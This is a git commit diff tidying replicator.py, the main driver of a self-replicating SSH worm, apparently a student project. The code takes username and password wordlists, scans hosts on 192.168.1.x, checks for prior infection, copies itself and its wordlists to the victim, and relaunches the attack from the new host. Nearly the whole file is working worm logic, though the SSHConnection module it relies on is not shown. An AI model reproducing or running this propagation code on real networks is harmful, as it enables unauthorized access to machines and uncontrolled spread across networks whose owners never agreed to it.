1f7b487ebe5dd5d4c6e461c5afef64fbbe5b9ead
David Poss <davidposs@csu.fullerton.edu>
2017-10-14 12:11:45 -0700

    Still tidying up

--- replicator.py
+++ replicator.py
@@ -1,39 +1,43 @@
-from SSHConnection import SSHConnection
+""" Main program to run an SSH worm. Can use SSHConnetion for basic replication
+    and add functionality for other kinds of worms. """
+import os
 import sys
 import argparse
-import os
+from SSHConnection import SSHConnection
 
 def main():
-
-    """ Let user specify username and passwordfiles at command line  """
+    """ User must specify the username and password file when they run the worm.
+    These files will travel with the worm in its adventure across the network.
+    Additionlly, the SSHConnection file will also travel with the worm, joining
+    the fellowship of the worms. """
     parser = argparse.ArgumentParser()
     parser.add_argument("usernames", nargs=1, help="File of usernames to try", type=str)
     parser.add_argument("passwords", nargs=1, help="File of passwords to try", type=str)
     args = parser.parse_args()
-    username_file = args.usernames[0]
-    password_file = args.passwords[0]
+    username_file = os.path.basename(args.usernames[0])
+    password_file = os.path.basename(args.passwords[0])
 
-    """ Create Instance of the SSH class """
+    #  Create Instance of the SSH class
     worm = SSHConnection()
 
-    """ Set locations  to place on victim system """
-    worm_file = os.path.basename(sys.argv[0])
-    host_dir = os.path.dirname(sys.argv[0])
-    worm.set_target_dir(host_dir + "/")
-    worm.set_host_dir(host_dir + "/")
+    # Set locations  to place on victim system
+    worm_file = os.path.basename(__file__)
+    host_dir = os.path.dirname(__file__)
+    if len(host_dir) > 0:
+        host_dir = host_dir + "/"
+    worm.set_target_dir(host_dir)
+    worm.set_host_dir(host_dir)
+    # Sets target directory to be same as one as where it was launched
     worm.set_files([worm_file, username_file, password_file])
-    """ Sets target directory to be same as one as where it was launched """
-    """ Set default vulnerable hosts to scan """
     worm.retrieve_vulnerable_hosts("192.168.1.", 10)
-    """ Find a target to infect, checks to make sure target hasn't previously
-        been infected """
+    # Find a target to infect, checks to make sure target hasn't previously been infected
     if worm.find_target_host():
-        """ Mark host system"""
+        # Mark target system
         worm.place_worm()
-        """ Start attack from new system """
+        # Start attack from new system
         worm.start_attack()
     else:
-        with open ("/tmp/no_found_hosts.txt", "w") as no_hosts:
+        with open("/tmp/no_found_hosts.txt", "w") as no_hosts:
             no_hosts.write("no hosts found")
     return
 
